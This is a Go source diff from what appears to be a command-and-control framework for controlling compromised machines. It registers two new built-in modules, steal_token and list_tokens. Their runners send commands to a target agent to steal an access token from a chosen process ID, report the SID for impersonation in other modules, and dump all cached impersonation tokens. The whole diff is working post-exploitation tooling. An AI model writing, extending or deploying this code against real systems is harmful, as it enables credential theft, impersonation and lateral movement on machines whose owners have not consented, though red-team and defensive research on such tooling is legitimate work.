@@ -27,10 +27,22 @@ var builtInGoModules = map[string]builtInGoModuleMeta{
 
 	def.ModListener:   {C2Cmd: def.C2CmdListener},
 	def.ModDownloader: {C2Cmd: def.C2CmdFileDownloader},
+
+	// steal_token and list_tokens use dedicated runners
+	def.ModStealToken: {C2Cmd: def.C2CmdStealToken, Special: true},
+	def.ModListTokens: {C2Cmd: def.C2CmdListTokens, Special: true},
 }
 
 func ensureBuiltInGoModuleRunners() {
 	autoRegisterBuiltInsOnce.Do(func() {
+		// Register dedicated runners for special built-ins
+		if !hasModuleRunner(def.ModStealToken) {
+			registerModuleRunner(def.ModStealToken, runStealToken)
+		}
+		if !hasModuleRunner(def.ModListTokens) {
+			registerModuleRunner(def.ModListTokens, runListTokens)
+		}
+
 		def.Modules.Range(func(key, value any) bool {
 			name := key.(string)
 			meta, ok := builtInGoModules[name]
@@ -160,4 +172,41 @@ func hasModuleRunner(name string) bool {
 	defer moduleRunnersMu.RUnlock()
 	_, ok := ModuleRunners[name]
 	return ok
+}
+
+// runStealToken is the dedicated runner for the steal_token built-in module.
+// It reads the "pid" flag from ctx.Flags, sends the !steal_token --pid <pid>
+// command to the target agent, and logs a reminder about using the resulting
+// SID in the "token" option of other modules.
+func runStealToken(ctx *c2context.C2Context) {
+	if ctx.Target == nil {
+		logging.Errorf("steal_token: no active agent")
+		return
+	}
+
+	pid, ok := ctx.Flags["pid"]
+	if !ok || strings.TrimSpace(pid) == "" {
+		logging.Errorf("steal_token: 'pid' flag is required – pass it with: steal_token --pid <PID>")
+		return
+	}
+
+	cmd := fmt.Sprintf("%s --pid %s", def.C2CmdStealToken, strconv.Quote(strings.TrimSpace(pid)))
+	if err := CmdSender(cmd, "", ctx.Target.Tag); err != nil {
+		logging.Errorf("steal_token: sending command: %v", err)
+		return
+	}
+
+	logging.Infof("steal_token: sent to %s (pid=%s) – on success the agent will report the SID; use that SID as the 'token' option in other modules", ctx.Target.Tag, pid)
+}
+
+// runListTokens sends !list_tokens to the target agent to dump all cached
+// impersonation tokens with their friendly names.
+func runListTokens(ctx *c2context.C2Context) {
+	if ctx.Target == nil {
+		logging.Errorf("list_tokens: no active agent")
+		return
+	}
+	if err := CmdSender(def.C2CmdListTokens, "", ctx.Target.Tag); err != nil {
+		logging.Errorf("list_tokens: sending command: %v", err)
+	}
 }
